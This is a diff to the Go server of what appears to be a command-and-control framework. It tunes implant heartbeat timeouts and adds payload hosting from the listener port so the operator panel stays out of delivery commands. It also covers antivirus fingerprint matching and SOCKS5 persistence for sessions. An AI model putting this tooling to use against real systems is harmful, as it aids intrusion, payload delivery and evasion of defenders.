@@ -36,7 +36,7 @@ import (
 
 var (
 	// version/commit/buildTime 由构建时 -ldflags 注入（默认 dev 构建）。
-	version   = "1.4.2"
+	version   = "1.4.3"
 	commit    = "dev"
 	buildTime = "unknown"
 )
@@ -228,9 +228,10 @@ func NewServer(cfgPath string) (*Server, error) {
 	}
 
 	// 会话心跳超时来自监听器配置（默认 60s）。这里**强制留出余量**（ROADMAP P0-1）：
-	// 阈值至少取 MarginFactor(3) 倍植入端心跳间隔。历史上 interval=60s 与
+	// 阈值至少取 MarginFactor 倍植入端心跳间隔。历史上 interval=60s 与
 	// heartbeat_timeout=60s 几乎零余量，任何一次心跳迟到（调度抖动/网络排队/休眠唤醒）
 	// 都会被判离线，下一次心跳又恢复，前端表现为「离线几秒又在线」抖动。
+	// v1.4.3 起 MarginFactor=4，并且每会话实际阈值还会再加 OfflineJitterGrace(15s)。
 	// 每个会话还会用实测心跳间隔自适应放宽（见 session.Session.effectiveTimeout）。
 	if cfg.Listener.HeartbeatTimeout > 0 {
 		session.HeartbeatTimeout = cfg.Listener.HeartbeatTimeout
@@ -246,8 +247,8 @@ func NewServer(cfgPath string) (*Server, error) {
 			session.HeartbeatTimeout, heartbeatInterval, withMargin, session.MarginFactor)
 		session.HeartbeatTimeout = withMargin
 	}
-	logging.Info("server", "Session heartbeat timeout: %v (implant interval %v, margin %dx)",
-		session.HeartbeatTimeout, heartbeatInterval, session.MarginFactor)
+	logging.Info("server", "Session heartbeat timeout: %v (implant interval %v, margin %dx + jitter grace %v)",
+		session.HeartbeatTimeout, heartbeatInterval, session.MarginFactor, session.OfflineJitterGrace)
 
 	// 加载服务端安全软件指纹库（data/av_fingerprints.json），供 av_detect 任务结果匹配
 	if err := avdetect.Load(); err != nil {
@@ -359,6 +360,9 @@ func NewServer(cfgPath string) (*Server, error) {
 	}
 	if httpListener != nil {
 		httpListener.SetOnTaskResult(taskResultCallback)
+		// 载荷托管（v1.4.3 #15b-B）：把 /<prefix>/<token>/<文件名> 交给 API 层的
+		// 托管处理器，载荷从监听器端口下发，命令行里不出现面板入口。
+		httpListener.SetPayloadHost(apiServer.HostedPayloadHandler)
 		httpListener.SetOnSessionDead(func(sessionID string) {
 			fmt.Printf("[INFO] [server] Session %s disconnected (SOCKS5 kept alive for reconnect)\n", sessionID)
 			apiServer.BroadcastSessionOffline(sessionID)
@@ -473,6 +477,8 @@ func (s *Server) Start() error {
 					logging.Error("server", "Failed to start HTTP listener: %v", err)
 				} else {
 					s.apiServer.RegisterRuntimeListener(s.config.Listener.ID, s.httpListener, s.httpListener.Stop)
+					// v1.4.3 #15b-B：HTTP 监听器真的在跑，托管下载地址才可用
+					s.apiServer.SetPayloadHostReady(true)
 				}
 			}
 		} else {
@@ -483,6 +489,7 @@ func (s *Server) Start() error {
 			logging.Error("server", "Failed to start HTTP listener: %v", err)
 		} else {
 			s.apiServer.RegisterRuntimeListener(s.config.Listener.ID, s.httpListener, s.httpListener.Stop)
+			s.apiServer.SetPayloadHostReady(true)
 		}
 	}
 
